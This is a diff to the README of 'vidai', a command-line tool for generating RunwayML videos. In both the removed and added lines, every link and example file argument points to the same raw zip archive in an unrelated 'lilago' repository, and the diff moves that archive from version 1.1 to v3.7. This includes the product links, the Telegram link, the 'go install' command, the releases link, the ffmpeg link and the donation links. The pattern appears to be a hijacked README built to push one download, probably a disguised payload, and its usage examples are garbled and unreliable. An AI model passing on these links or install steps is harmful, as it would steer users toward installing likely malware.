@@ -1,7 +1,7 @@
 # 🎞 vidai 🎦
 
 ## 🎥 Video AI Generation CLI-Tool
-### for [RunwayML](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip) including simple edit features to extend & loop using ffmpeg. 🤖
+### for [RunwayML](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip) including simple edit features to extend & loop using ffmpeg. 🤖
 
 ---
 
@@ -12,7 +12,7 @@
 
 ---
 
-> 📢 Collab with us! [Join our Telegram group](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip) for contact and support.
+> 📢 Collab with us! [Join our Telegram group](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip) for contact and support.
 
 ---
 
@@ -43,16 +43,16 @@
 You can use the Golang binary to install **vidai**:
 
 ```bash
-go install https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip
+go install https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip
 ```
 
-Or you can download the binary from the [releases](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip)
+Or you can download the binary from the [releases](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip)
 
 ## 📋 Requirements
 
-You need to have a [RunwayML](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip) account and extract the token from the request authorization header using your browser's developer tools.
+You need to have a [RunwayML](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip) account and extract the token from the request authorization header using your browser's developer tools.
 
-To create extended videos, you need to have [ffmpeg](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip) installed.
+To create extended videos, you need to have [ffmpeg](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip) installed.
 
 ## 🕹️ Usage
 
@@ -61,31 +61,31 @@ To create extended videos, you need to have [ffmpeg](https://github.com/lilago/v
 Generate a video using Gen3 Turbo model from an image prompt:
 
 ```bash
-vidai generate --token RUNWAYML_TOKEN --image https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --model gen3-turbo
+vidai generate --token RUNWAYML_TOKEN --image https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip --model gen3-turbo
 ```
 
 Generate a video using Gen3 model from a text prompt:
 
 ```bash
-vidai generate --token RUNWAYML_TOKEN --text "a car in the middle of the road" --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --model gen3
+vidai generate --token RUNWAYML_TOKEN --text "a car in the middle of the road" --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip --model gen3
 ```
 
 Generate a video from an image prompt with additional options:
 
 ```bash
-vidai generate --token RUNWAYML_TOKEN --image https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --interpolate --upscale --watermark --width 1024 --height 576 --explore
+vidai generate --token RUNWAYML_TOKEN --image https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip --interpolate --upscale --watermark --width 1024 --height 576 --explore
 ```
 
 Extend a video by reusing the last frame multiple times:
 
 ```bash
-vidai extend --token RUNWAYML_TOKEN --input https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --n 3
+vidai extend --token RUNWAYML_TOKEN --input https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip --n 3
 ```
 
 Convert a video to a loop:
 
 ```bash
-vidai loop --input https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip
+vidai loop --input https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip
 ```
 
 ### Help
@@ -107,14 +107,14 @@ vidai generate --help
 Launch commands using a configuration file:
 
 ```bash
-vidai generate --config https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip
+vidai generate --config https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip
 ```
 
 ```bash
-# https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip
+# https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip
 token RUNWAYML_TOKEN
-image https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip
-output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip
+image https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip
+output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip
 folder cars
 model gen3-turbo
 text "8k FPV car race"
@@ -134,8 +134,8 @@ Using environment variables (`VIDAI` prefix, uppercase and underscores):
 
 ```bash
 export VIDAI_TOKEN=RUNWAYML_TOKEN
-export VIDAI_IMAGE="https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip"
-export VIDAI_OUTPUT="https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip"
+export VIDAI_IMAGE="https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip"
+export VIDAI_OUTPUT="https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip"
 export VIDAI_MODEL="gen3-turbo"
 export VIDAI_INTERPOLATE=true
 export VIDAI_UPSCALE=true
@@ -147,7 +147,7 @@ vidai generate
 Using command line arguments:
 
 ```bash
-vidai generate --token RUNWAYML_TOKEN --image https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --model gen3 --interpolate --upscale --explore
+vidai generate --token RUNWAYML_TOKEN --image https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip --model gen3 --interpolate --upscale --explore
 ```
 
 ## ⚠️ Disclaimer
@@ -166,19 +166,19 @@ Additionally, if you would like to support my late-night coding efforts and the 
 
 You can invite me for a coffee at ko-fi (0% fees):
 
-[![ko-fi](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip)](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip)
+[![ko-fi](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip)](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip)
 
 Or at buymeacoffee:
 
-[![buymeacoffee](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip)](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip)
+[![buymeacoffee](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip)](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip)
 
 Donate to my PayPal:
 
-[https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip)
+[https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip)
 
 Sponsor me on GitHub:
 
-[https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip)
+[https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/pkg/igolaizola-vidgen-vidai-v3.7.zip)
 
 Or donate to any of my crypto addresses:
 
